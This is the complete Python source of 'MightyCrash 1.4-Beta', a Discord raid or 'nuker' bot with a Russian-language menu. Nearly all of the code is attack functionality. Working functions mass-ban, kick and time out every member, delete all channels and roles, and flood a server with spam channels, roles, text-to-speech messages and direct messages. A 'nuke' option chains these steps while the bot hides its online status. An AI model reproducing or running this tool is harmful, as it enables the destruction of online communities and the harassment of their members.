import requests, os, sys, threading, time, json, asyncio, os.path, discord, aiohttp, random, datetime, pystyle, configparser, pwinput, hashlib, httpx
from discord_webhook import DiscordWebhook, DiscordEmbed
from pystyle import Colors, Colorate
from pypresence import Presence
from discord.ext import commands
from pystyle import Colors, Colorate
from keyauth import *

os.system(f'title [MightyCrash 1.4-Beta] - Startup')

try:
    httpx.get('https://google.com')
except (httpx.NetworkError, httpx.TimeoutException):
    os.system(f'title [MightyCrash 1.4-Beta] - Not internet connection')
    print("\x1b[38;5;196m> \033[37mИнтернет подключение отсутствует\x1b[38;5;196m!")
    input()
    os._exit(0)

config = configparser.ConfigParser()
config.read('config.ini')

if os.path.exists('config.ini') == True:
    pass
else:
    token = input(f'\x1b[38;5;196m> \033[37mВведите токен\x1b[38;5;196m: \033[37m')
    with open('config.ini', 'w') as configdolbaeb:    # save
        configdolbaeb.write(f'[MightyCrasher]\nWhitelist = []\nToken = ' + fR'"{token}"' + '\n[Thread]\nThreadSpam = 20')
    time.sleep(1)
    print("Требуется перезапуск!\nНажмите Enter для закрытия программы...")
    input()
    os._exit(0)

whitelistmembers = json.loads(config.get("MightyCrasher", "Whitelist"))
token = json.loads(config.get("MightyCrasher", "Token"))
ThreadSpam = json.loads(config.get("Thread", "ThreadSpam"))

try:
    int(f"{ThreadSpam}")
except Exception:
    print("[config] ThreadSpam должен иметь только числа!")
    input()
    os._exit(0)

try:
    if whitelistmembers == " " or whitelistmembers == [""]:
        int(f"{whitelistmembers}")
except Exception:
    print("[config] Whitelist должен иметь только числа!")
    input()
    os._exit(0)


def loading():
    os.system("mode 80,22")
    print(Colorate.Horizontal(Colors.yellow_to_red, '''                                  ,,,,,,,,,\n                              .d$$$******$$$$c.\n                           .d$P"            "$$c      \n                           $$$$$.          .$$$*$.    \n                        .$$ 4$L*$$.     .$$Pd$  '$b   \n                        $F   *$. "$$e.e$$" 4$F   ^$b  \n                       d$     $$   z$$$e   $$     '$. \n                       $P     `$L$$P` `"$$d$"      $$ \n                       $$     e$$F       4$$b.     $$ \n                       $b  .$$" $$      .$$ "4$b.  $$ \n                       $$e$P"    $b     d$`    "$$c$F \n                       '$P$$$$$$$$$$$$$$$$$$$$$$$$$$  \n                        "$c.      4$.  $$       .$$   \n                         ^$$.      $$ d$"      d$P    \n                          "$$c.    `$b$F    .d$P"     \n                            `4$$$c..$$$..e$$P"        \n                                `^^^^^^^^`\n                                \n                                MightyCRASH\n          __________________________________________________________\n                               Please wait...'''))
    
threading.Thread(target=loading).start()
os.system(f'title [MightyCrash 1.4-Beta] - Check token')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        print("Извините но селфкрашер пока-что не доступен, ждите обновы!")
        time.sleep(3)
        os._exit(0)
    else:
        return

token_type = check_token()
intents = discord.Intents.all()
intents.members = True
headers = {'Authorization': f'Bot {token}'}
mightycrash = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)
mightycrash.remove_command("help")

class MightyCrash:
    def __init__(self):
        self.colour = '\x1b[38;5;196m'

    def killprogramkey():
        time.sleep(5395)
        os._exit(0)

    threading.Thread(target=killprogramkey).start()

    def BanMembers(self, guild, member, member_id):
        if int(f"{member_id}") in whitelistmembers:
            print(f"{self.colour}[\033[37m-{self.colour}]\033[37m Не кикнул, потому что в вайтлисте{self.colour} {str(member).strip()} ({str(member_id).strip()})\033[37m")
        else:
            while True:
                r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member_id}", headers=headers)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Забанил{self.colour} {str(member).strip()} ({str(member_id).strip()})\033[37m")
                        break
                    else:
                        break

    def KickMembers(self, guild, member, member_id):
        if int(f"{member_id}") in whitelistmembers:
            print(f"{self.colour}[\033[37m-{self.colour}]\033[37m Не забанил, потому что в вайтлисте{self.colour} {str(member).strip()} ({str(member_id).strip()})\033[37m")
        else:
            while True:
                r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member_id}", headers=headers)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Кикнут{self.colour} {str(member).strip()} ({str(member_id).strip()})\033[37m")
                        break
                    else:
                        break

    def DeleteChannels(self, guild, channel, channel_id):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel_id}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Канал удалён {self.colour}{str(channel).strip()} ({str(channel_id).strip()})\033[37m")
                    break
                else:
                    break
          
    def DeleteRoles(self, guild, role, role_id):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role_id}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Роль удаленна{self.colour} {str(role).strip()} ({str(role_id).strip()})\033[37m")
                    break
                else:
                    break

    def SpamChannels(self, guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Created Channel{self.colour} {name}\033[37m")
                    break
                else:
                    break

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Created Role{self.colour} {name}\033[37m")
                    break
                else:
                    break

    async def spamdmguildnuke(self, channelgetting, text):
        channelbase = mightycrash.get_channel(int(f"{channelgetting}"))
        for member_id in channelbase.guild.members:
            try:
                await member_id.send(content=text)
                print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Отправленно{self.colour} {member_id}\033[37m")
            except:
                continue

    async def spamdmguild(self):
        guild = input(f'{self.colour}> \033[37mАйди сервера{self.colour}: \033[37m')
        guildchan = mightycrash.get_guild(int(guild))
        for channel in guildchan.channels:
            channelgetting = channel.id
        text = input(f'{self.colour}> \033[37mЧто будет писать бот{self.colour}: \033[37m')
        channelbase = mightycrash.get_channel(int(f"{channelgetting}"))
        for member_id in channelbase.guild.members:
            try:
                await member_id.send(content=text)
                print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Отправленно{self.colour} {member_id} ({member_id.id})\033[37m")
            except:
                continue

    async def spammsg(self, channelgetting, text):
        while True:
            for channelspam in channelgetting.guild.text_channels:
                try:
                    await channelspam.send(text, tts=True)
                except Exception:
                    continue

    async def NukeExecute(self):
        guild = input(f'{self.colour}> \033[37mАйди сервера{self.colour}: \033[37m')
        channel_name = input(f"{self.colour}> \033[37mНавание каналов{self.colour}: \033[37m")
        channel_amount = input(f"{self.colour}> \033[37mКоличество каналов{self.colour}: \033[37m")
        role_name = input(f"{self.colour}> \033[37mНазвания ролей{self.colour}: \033[37m")
        role_amount = input(f"{self.colour}> \033[37mКоличество ролей{self.colour}: \033[37m")
        text = input(f'{self.colour}> \033[37mЧто будет спамить бот на сервере{self.colour}: \033[37m')
        text1 = input(f'{self.colour}> \033[37mЧто будет писать бот в личку всем участникам сервера{self.colour}: \033[37m')
        guildchan = mightycrash.get_guild(int(f"{guild}"))
        iteration = 0
        channelbase = guildchan.channels[0]
        for member_id in channelbase.guild.members:
            try:
                await member_id.send(content=text1)
                print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Отправленно{self.colour} {member_id} ({member_id.id})\033[37m")
            except:
                continue
        time.sleep(0.5)
        for member_ban in channelbase.guild.members:
            try: threading.Thread(target=self.BanMembers, args=(guild, member_ban, member_ban.id)).start()
            except: continue
        time.sleep(0.5)
        for channel_delete in channelbase.guild.channels:
            try: threading.Thread(target=self.DeleteChannels, args=(guild, channel_delete, channel_delete.id)).start()
            except: continue
        time.sleep(0.5)
        for i in range(int(f"{channel_amount}")):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        time.sleep(0.5)
        for i in range(int(f"{role_amount}")):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        time.sleep(0.5)
        for z in range(int(f'{ThreadSpam}')): 
            asyncio.create_task(self.spammsg(channelbase, text))

        

    async def Mascarad(self):
        guild = input(f'{self.colour}> \033[37mАйди сервера{self.colour}: \033[37m')
        nickname = input(f'{self.colour}> \033[37mУкажите ник{self.colour}: \033[37m')
        guildchan = mightycrash.get_guild(int(guild))
        for channel in guildchan.channels:
            channelgetting = channel.id
        channelbase = mightycrash.get_channel(int(f"{channelgetting}"))
        for member in channelbase.guild.members:
            try:
                await member.edit(nick=nickname)
                print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Изменил ник участнику:{self.colour} {member}\033[37m в{self.colour} {nickname} \033[37m")
            except: continue

    async def BanExecute(self):
        guild = input(f'{self.colour}> \033[37mАйди сервера{self.colour}: \033[37m')
        guildchan = mightycrash.get_guild(int(f"{guild}"))
        for channel in guildchan.channels:
            channelgetting = channel.id
        channelbase = mightycrash.get_channel(int(f"{channelgetting}"))
        for member in channelbase.guild.members:
            try: threading.Thread(target=self.BanMembers, args=(guild, member, member.id)).start()
            except: continue

    async def KickExecute(self):
        guild = input(f'{self.colour}> \033[37mАйди сервера{self.colour}: \033[37m')
        guildchan = mightycrash.get_guild(int(f"{guild}"))
        for channel in guildchan.channels:
            channelgetting = channel.id
        channelbase = mightycrash.get_channel(int(f"{channelgetting}"))
        for member in channelbase.guild.members:
            try: threading.Thread(target=self.KickMembers, args=(guild, member, member.id,)).start()
            except: continue

    async def ChannelDeleteExecute(self):
        guild = input(f'{self.colour}> \033[37mАйди сервера{self.colour}: \033[37m')
        guildchan = mightycrash.get_guild(int(f"{guild}"))
        for channel in guildchan.channels:
            channelgetting = channel.id
        channelbase = mightycrash.get_channel(int(f"{channelgetting}"))
        for channel in channelbase.guild.channels:
            try: threading.Thread(target=self.DeleteChannels, args=(guild, channel, channel.id)).start()
            except: continue
        time.sleep(1)

    async def RoleDeleteExecute(self):
        print(f"\033[37mВАЖНО{self.colour}!!!\033[37m На роли огромный рейтлимит по этому удаление займёт кучу времени{self.colour}!!!\033[37m")
        if input(f"\033[37mПродолжить? \033[37m[{self.colour}Y\033[37m/{self.colour}N\033[37m]{self.colour}: \033[37m") in ['Y', 'y']:
            guild = input(f'{self.colour}> \033[37mАйди сервера{self.colour}: \033[37m')
            guildchan = mightycrash.get_guild(int(f"{guild}"))
            for channel in guildchan.channels:
                channelgetting = channel.id
            channelbase = mightycrash.get_channel(int(f"{channelgetting}"))
            for role in channelbase.guild.roles:
                try: self.DeleteRoles(guild, role, role.id)
                except: continue
            time.sleep(1)
        else: await self.Menu()
        

    def randomstring(self, amount):
        return ''.join(random.choices("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm12345678901234567890", k=amount))

    async def ChannelSpamExecute(self):
        guild = input(f'{self.colour}> \033[37mАйди сервера{self.colour}: \033[37m')
        name = input(f"{self.colour}> \033[37mНазвание каналов{self.colour}: \033[37m")
        amount = input(f"{self.colour}> \033[37mКолличество{self.colour}: \033[37m")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        guild = input(f'{self.colour}> \033[37mАйди сервера{self.colour}: \033[37m')
        name = input(f"{self.colour}> \033[37mНазвания ролей{self.colour}: \033[37m")
        amount = input(f"{self.colour}> \033[37mКолличество{self.colour}: \033[37m")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

    async def MemberTimeout(self):
        guild = input(f'{self.colour}> \033[37mАйди сервера{self.colour}: \033[37m')
        reason = input(f'{self.colour}> \033[37mПричина мута{self.colour}: \033[37m')
        guildchan = mightycrash.get_guild(int(guild))
        for channel in guildchan.channels:
            channelgetting = channel.id
        channelbase = mightycrash.get_channel(int(f"{channelgetting}"))
        for member in channelbase.guild.members:
            try:    
                await member.timeout(datetime.timedelta(milliseconds=604800000), reason=reason)
                print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Замучен{self.colour} {member}\033[37m")
            except: continue

    async def guildhelp(self):
        os.system('cls')
        print(f'-------------------------------------------\n\033[37mЯ нахожусь на этих серверах{self.colour}: \033[37m\n-------------------------------------------')
        for guild in mightycrash.guilds:
            print(f"{self.colour}Сервер: \033[37m{guild.name} {self.colour}/ \033[37m{guild.id}\033[37m\n")
        print("\n ")
        input(f'\033[37mНажмите Enter чтобы продолжить{self.colour}...\033[37m\n')
        await self.Menu()

    async def spammsgmenu(self):
        guild = input(f'{self.colour}> \033[37mАйди сервера{self.colour}: \033[37m')
        guildchan = mightycrash.get_guild(int(guild))
        text = input(f'{self.colour}> \033[37mЧто будет писать бот{self.colour}: \033[37m')
        #threadsend = input(f'{self.colour}> \033[37mThread{self.colour}: \033[37m')
        for z in range(int(f'{ThreadSpam}')): 
            asyncio.create_task(self.spammsg(guildchan.channels[0], text))
        print(f'{self.colour}> \033[37mДанная функция запущенна в многопотоке или же в фоновом режиме!{self.colour}: \033[37m')

    async def ThemeChanger(self):
        os.system(f'cls & mode 85,20 & title [MightyCrash 1.4-Beta] - Themes')
        print(f'''
      {self.colour}                    __  __  _        _      _          
      {self.colour}                   |  \/  |(_)      | |    | |         
      {self.colour}                   | \  / | _  ____ | |__  | |_  _   _ 
      {self.colour}                   | |\/| || |/ _  ||  _ \ | __|| | | |
      {self.colour}                   | |  | || | (_| || | | || |_ | |_| |
      {self.colour}                   |_|  |_||_|\__  ||_| |_| \__| \__  |
      {self.colour}                               __/ |              __/ |
      {self.colour}                              |___/              |___/  
      {self.colour}
      {self.colour}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      {self.colour}║ \033[37m[{self.colour}1\033[37m] \033[37mКрасный           {self.colour}║\033[37m [{self.colour}5\033[37m] \033[37mФиолетовый        {self.colour}║\033[37m [{self.colour}9\033[37m] \033[37mСерый             {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}2\033[37m] \033[37mЗелёный           {self.colour}║\033[37m [{self.colour}6\033[37m] \033[37mСиний             {self.colour}║\033[37m [{self.colour}0\033[37m] \033[37mПерсиковый        {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}3\033[37m] \033[37mЖёлтый            {self.colour}║\033[37m [{self.colour}7\033[37m] \033[37mРозовый           {self.colour}║\033[37m [{self.colour}R\033[37m] \033[37mУбрать цвета      {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}4\033[37m] \033[37mМандариновый      {self.colour}║\033[37m [{self.colour}8\033[37m] \033[37mОкеанический      {self.colour}║\033[37m [{self.colour}X\033[37m] \033[37mMenu              {self.colour}║\033[37m
      {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m
             
        \033[37m''')
        choice = input(f'{self.colour}> \033[37mВыбор{self.colour}: \033[37m')

        if choice == '1':
            self.colour = '\x1b[38;5;196m' # красный
            await self.ThemeChanger()
        elif choice == '2':
            self.colour = '\x1b[38;5;10m' # Зелёный
            await self.ThemeChanger()
        elif choice == '3':
            self.colour = '\x1b[38;5;142m' # жёлтый
            await self.ThemeChanger()
        elif choice == '4':
            self.colour = '\x1b[38;5;172m' # Оранжевый
            await self.ThemeChanger()
        elif choice == '5':
            self.colour = '\x1b[38;5;56m' # Фиолетовый
            await self.ThemeChanger()
        elif choice == '6':
            self.colour = '\x1b[38;5;32m' # синий
            await self.ThemeChanger()
        elif choice == '7':
            self.colour = '\x1b[38;5;201m' # розовый
            await self.ThemeChanger()
        elif choice == '8':
            self.colour = '\x1b[38;5;51m' # Берюзовый
            await self.ThemeChanger()
        elif choice == '9':
            self.colour = '\x1b[38;5;103m' # Серый
            await self.ThemeChanger()
        elif choice == '0':
            self.colour = '\x1b[38;5;209m' # Персиковый
            await self.ThemeChanger()
        elif choice == 'r' or choice == 'R':
            self.colour = '\x1b[38;5;364m' # Белый
            await self.ThemeChanger()
        elif choice == 'secret':
            self.colour = '\x1b[38;5;42m' # Пасхалка
            await self.ThemeChanger()
        elif choice == '' or choice == ' ':
            await self.ThemeChanger()
        elif choice == 'X' or choice == 'x':
            await self.Menu()
        elif choice not in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'secret', 'x', 'X']:
            print(f'{self.colour}> \033[37mТакой функции нету{self.colour}! \033[37m')
            time.sleep(2)
            await self.ThemeChanger()

    async def Menu(self):
        os.system(f'cls & mode 85,20 & title [MightyCrash 1.4-Beta] - Подключенно: {mightycrash.user}')
        print(f'''
      {self.colour}                    __  __  _        _      _          
      {self.colour}                   |  \/  |(_)      | |    | |         
      {self.colour}                   | \  / | _  ____ | |__  | |_  _   _ 
      {self.colour}                   | |\/| || |/ _  ||  _ \ | __|| | | |
      {self.colour}                   | |  | || | (_| || | | || |_ | |_| |
      {self.colour}                   |_|  |_||_|\__  ||_| |_| \__| \__  |
      {self.colour}                               __/ |              __/ |
      {self.colour}                              |___/              |___/ 
      {self.colour}
      {self.colour}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      {self.colour}║ \033[37m[{self.colour}1\033[37m] \033[37mЗабанить всех     {self.colour}║\033[37m [{self.colour}6\033[37m] \033[37mУдалить каналы    {self.colour}║\033[37m [{self.colour}11\033[37m] \033[37mИнформация       {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}2\033[37m] \033[37mКикнуть всех      {self.colour}║\033[37m [{self.colour}7\033[37m] \033[37mСоздать роли      {self.colour}║\033[37m [{self.colour}12\033[37m] \033[37mМаскарад         {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}3\033[37m] \033[37mЗамутить всех     {self.colour}║\033[37m [{self.colour}8\033[37m] \033[37mСоздать каналы    {self.colour}║\033[37m [{self.colour}13\033[37m] \033[37m                 {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}4\033[37m] \033[37mУдалить роли      {self.colour}║\033[37m [{self.colour}9\033[37m] \033[37mСпам              {self.colour}║\033[37m [{self.colour}14\033[37m] \033[37mИзменить тему    {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}5\033[37m] \033[37mНаписать всем     {self.colour}║\033[37m [{self.colour}10\033[37m] \033[37mНюкнуть сервер   {self.colour}║\033[37m [{self.colour}X\033[37m]  \033[37mВыйти            {self.colour}║\033[37m
      {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m
             
        \033[37m''')

        choice = input(f'{self.colour}> \033[37mВыбор{self.colour}: \033[37m')
        if choice == '1':
            await self.BanExecute()
            time.sleep(4)
            await self.Menu()
        elif choice == '2':
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await self.MemberTimeout()
            time.sleep(4)
            await self.Menu()
        elif choice == '4':
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == "5":
            await self.spamdmguild()
            time.sleep(4)
            await self.Menu()
        elif choice == '6':
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '7':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '9':
            await self.spammsgmenu()
        elif choice == '10':
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '11':
            await self.guildhelp()
        elif choice == '12':
            await self.Mascarad()
            time.sleep(2)
            await self.Menu()
        elif choice == '13':
            await self.Menu()
        elif choice == '14':
            await self.ThemeChanger()
            time.sleep(3)
            await self.Menu()
        elif choice == '' or choice == ' ':
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)
        elif choice not in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', 'x', 'X', '', ' ']:
            print(f'{self.colour}> \033[37mДанной функции не существует{self.colour}! \033[37m')
            time.sleep(1)
            await self.Menu()


    @mightycrash.event
    async def on_ready():
        await mightycrash.change_presence(status=discord.Status.invisible)
        os.system(f'cls & mode 85,20 & title [MightyCrash 1.4-Beta] - Startup successful')
        await MightyCrash().Menu()
            
    def Startup(self):
        try:
            mightycrash.run(token)
        except Exception:
            if token in ['', ' ', '  ', '   ', '    ']:
                print(f'{self.colour}> \033[37mВы забыли ввести токен в config.ini!')
                os.system(f'cls & mode 85,20 & title [MightyCrash 1.4-Beta] - Токен не был найден в конфиге')
                input()
                os._exit(0)
            else:
                os.system(f'cls & mode 85,20 & title [MightyCrash 1.4-Beta] - Token invalid')
                print(f'{self.colour}> \033[37mТокен не валидный')
                input()
                os._exit(0)

if __name__ == "__main__":
    MightyCrash().Startup()